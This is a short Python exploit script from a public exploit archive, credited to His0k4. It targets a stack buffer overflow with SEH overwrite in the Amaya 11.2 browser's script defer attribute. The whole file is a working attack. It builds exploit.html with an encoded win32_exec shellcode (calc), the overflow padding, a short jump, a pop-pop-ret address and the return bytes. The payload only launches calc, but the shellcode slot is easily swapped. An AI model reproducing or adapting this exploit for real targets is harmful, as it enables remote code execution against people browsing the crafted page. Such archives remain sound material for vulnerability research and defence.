#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[+] Bug :	 Amaya 11.2 W3C Editor/Browser (defer) Remote BOF Exploit (SEH)
#[+] Tested on : Xp sp3 (en) under (vb)
#[+] Refer : 	 http://www.milw0rm.com/exploits/8314
#[+] Exploit : 	 His0k4
#[+] Greetz : 	 All friends (DZ)

#[x] Note : The html file must be browsed from a webserver

#win32_exec calc encoded with alpha2=>374 bytes.
shellcode = (
"JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
"TiKyosYyyN8YzN9IT4utL4SkoqRSwcUOJKKJ7rMSzKKLIrkDysv"
"cONtBUOjKrQCwEscPlFEWcWJJVuk9pPkCPqqMeokZTQPKLTkoQa"
"ws8qYJFZmKLsbOVZBVvxEzfPdOwnQ921l6Q4OOyN362JfnrQSmU"
"kkZr1e4OdhgnQLISp9gkKZIntL7qa5Sl4QroV5vUKDhxKyR3KSP"
"MjTrMJvKnbVnlTLkKFOyPozWf7NiqgXcTQVkMDbKqZtBuOXkT1p"
"jusNTJkL4cOMmPszZmLtkmQsbRWUKppS6SpMSQrilNum5nMYmL8"
"k8ok2NSLjKkJ32WzA")

payload =  "<script defer=\""
payload += "\x41"*6914		#change this value if needed
payload += "\x74\x06\x41\x41"	#short jump
payload += "\x50\x1A\x03\x10"	#pop pop ret somewhere
payload += "\x61"*13	# popad
payload += "\x52\xC3"	# push edx,retn C3 not mangled ouf!
payload += "\x44"*668	# padding
payload += shellcode
payload += "\x45"*5000	# result
payload += "\">"

try:
    out_file = open("exploit.html","w")
    out_file.write(payload)
    out_file.close()
    print("\nExploit file created!\n")
except:
    print "Error"

